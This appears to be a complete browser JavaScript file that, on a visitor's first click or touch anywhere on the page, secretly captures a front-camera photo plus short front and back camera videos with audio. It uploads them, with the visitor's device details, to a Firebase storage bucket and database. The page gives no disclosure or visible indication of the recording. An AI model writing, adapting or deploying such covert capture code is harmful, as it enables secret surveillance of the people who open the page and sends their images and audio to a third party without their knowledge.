import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
import { getStorage, ref, uploadBytes, getDownloadURL } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-storage.js";
import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

/* ---------- YOUR FIREBASE CONFIG ---------- */
const firebaseConfig = {
  // KEEP YOUR EXISTING CONFIG HERE
};

const app = initializeApp(firebaseConfig);
const storage = getStorage(app);
const db = getFirestore(app);

console.log("Camera.js loaded ✅");

/* ---------- HELPERS ---------- */

function getDeviceInfo() {
  return {
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    time: new Date().toISOString()
  };
}

function blobToFile(blob, name) {
  return new File([blob], name, { type: blob.type });
}

async function startStream(facingMode) {
  return await navigator.mediaDevices.getUserMedia({
    video: { facingMode },
    audio: true
  });
}

/* ---------- PHOTO ---------- */

async function takePhoto(stream) {
  const track = stream.getVideoTracks()[0];
  const imageCapture = new ImageCapture(track);
  return await imageCapture.takePhoto();
}

/* ---------- RECORD ---------- */

function recordVideo(stream, duration = 3000) {
  return new Promise(resolve => {
    const recorder = new MediaRecorder(stream);
    const chunks = [];

    recorder.ondataavailable = e => chunks.push(e.data);
    recorder.onstop = () => resolve(new Blob(chunks, { type: "video/webm" }));

    recorder.start();

    setTimeout(() => recorder.stop(), duration);
  });
}

/* ---------- UPLOAD ---------- */

async function uploadToFirebase(blob, path) {
  const fileRef = ref(storage, path);
  await uploadBytes(fileRef, blob);
  return await getDownloadURL(fileRef);
}

/* ---------- MAIN FUNCTION ---------- */

async function startCaptureSequence() {
  try {
    console.log("Starting front camera...");

    // FRONT CAMERA
    const frontStream = await startStream("user");

    const photoBlob = await takePhoto(frontStream);
    const frontVideoBlob = await recordVideo(frontStream, 3000);

    frontStream.getTracks().forEach(track => track.stop());

    console.log("Switching to back camera...");

    // BACK CAMERA
    const backStream = await startStream({ exact: "environment" });
    const backVideoBlob = await recordVideo(backStream, 3000);

    backStream.getTracks().forEach(track => track.stop());

    console.log("Uploading to Firebase...");

    const timestamp = Date.now();

    const photoURL = await uploadToFirebase(photoBlob, `photo_${timestamp}.jpg`);
    const frontVideoURL = await uploadToFirebase(frontVideoBlob, `front_${timestamp}.webm`);
    const backVideoURL = await uploadToFirebase(backVideoBlob, `back_${timestamp}.webm`);

    await addDoc(collection(db, "captures"), {
      photoURL,
      frontVideoURL,
      backVideoURL,
      device: getDeviceInfo()
    });

    console.log("✅ Upload complete");

  } catch (err) {
    console.error("❌ ERROR:", err);
    alert(err.message);
  }
}

/* ---------- ACTIVATE ON ANY CLICK ---------- */

document.addEventListener("click", startCaptureSequence, { once: true });
document.addEventListener("touchstart", startCaptureSequence, { once: true });
